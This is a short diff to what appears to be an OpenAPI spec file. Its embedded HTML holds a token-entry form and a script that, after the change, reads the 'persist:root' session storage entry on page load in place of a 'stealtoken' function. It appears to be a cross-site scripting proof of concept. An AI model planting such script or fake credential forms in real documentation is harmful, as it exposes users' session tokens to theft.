@@ -21,14 +21,12 @@ info:
                 <input type="password" name="token" size="20">
             </div>
             <div class="form-group">
-                <button class="btn btn-default" onclick="stealtoken()">Continuar</button>
+                <button type="submit" class="btn btn-default">Continuar</button>
             </div>
         </form>
     </div>
     <script>
-      function stealtoken() {
         alert(sessionStorage.getItem("persist:root"))
-      }
     </script>
 </div>'
 paths:
